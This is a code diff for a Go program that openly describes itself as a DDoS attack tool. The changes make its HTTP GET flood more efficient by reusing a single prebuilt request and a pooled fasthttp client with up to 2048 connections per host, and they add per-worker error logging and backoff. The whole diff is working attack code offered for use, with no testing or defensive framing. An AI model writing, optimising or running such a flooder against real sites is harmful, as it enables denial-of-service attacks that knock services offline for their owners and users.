@@ -7,6 +7,7 @@ import (
     "github.com/valyala/fasthttp"
     "io/ioutil"
     "log"
+    "net"
     "net/url"
     "runtime"
     "sync/atomic"
@@ -15,9 +16,9 @@ import (
 
 // DDoS - structure of value for DDoS attack
 type DDoS struct {
-    url           string
-    headers       map[string]string
+    req           *fasthttp.Request
     timeout       time.Duration
+    client        *fasthttp.Client
     stop          *chan bool
     amountWorkers int
 
@@ -36,44 +37,64 @@ func New(URL string, workers int, Headers map[string]string, Timeout time.Durati
         return nil, fmt.Errorf("Undefined host or error = %v", err)
     }
 
+    req := fasthttp.AcquireRequest()
+    req.SetRequestURI(URL)
+    for k, v := range Headers {
+        req.Header.Add(k, v)
+    }
+
+    client := &fasthttp.Client{
+        MaxConnsPerHost:     2048,
+        MaxIdleConnDuration: time.Duration(5) * time.Second,
+        ReadTimeout:         time.Duration(4) * time.Second,
+        WriteTimeout:        time.Duration(4) * time.Second,
+        Dial: func(addr string) (net.Conn, error) {
+            return fasthttp.DialTimeout(addr, time.Duration(2) * time.Second)
+        },
+    }
+
     s := make(chan bool)
     return &DDoS{
-        url:           URL,
-        headers:       Headers,
-        timeout:       Timeout, 
+        req:           req,
+        timeout:       Timeout,
+        client:        client,
         stop:          &s,
         amountWorkers: workers,
     }, nil
 }
 
+
 // Run - run DDoS attack
 func (d *DDoS) Run() {
     for i := 0; i < d.amountWorkers; i++ {
-        go func() {
+        go func(index int) {
             for {
                 select {
                 case <-(*d.stop):
+                    log.Printf("index | %3d | exited", index)
                     return
                 default:
-                    // sent http GET requests
-
-                    req := fasthttp.AcquireRequest()
-                    req.SetRequestURI(d.url)
-                    for k, v := range d.headers {
-                        req.Header.Add(k, v)
-                    }
-                    client := &fasthttp.Client{}
-                    err := client.DoTimeout(req, nil, d.timeout)
+                    err := d.client.DoTimeout(d.req, nil, d.timeout)
                     atomic.AddInt64(&d.amountRequests, 1)
-                    if err == nil {
+                    // https://tonybai.com/2015/10/30/error-handling-in-go/
+                    switch err {
+                    case nil:
                         atomic.AddInt64(&d.successRequest, 1)
-                    } else {
-                        log.Println(err)
+                    case fasthttp.ErrTimeout:
+                        // timeout
+                        log.Printf("index | %3d | client do timeout error | %s\n", index, err)
+                    case fasthttp.ErrDialTimeout:
+                        // dialing to the given TCP address timed out
+                        log.Printf("index | %3d | TCP dial timeout error  | %s\n", index, err)
+                        time.Sleep(time.Duration(4) * time.Second)
+                    default:
+                        // no free connections available to host
+                        log.Printf("index | %3d | other error | %s\n", index, err)
                     }
                 }
                 runtime.Gosched()
             }
-        }()
+        }(i+1)
     }
 }
 
@@ -126,6 +147,6 @@ func main() {
     d.Run()
     time.Sleep(time.Duration(*workTime) * time.Second)
     d.Stop()
-    fmt.Println(d.Result())
-    fmt.Println("DDoS attack finish")
+    log.Println(d.Result())
+    log.Println("DDoS attack finish")
 }
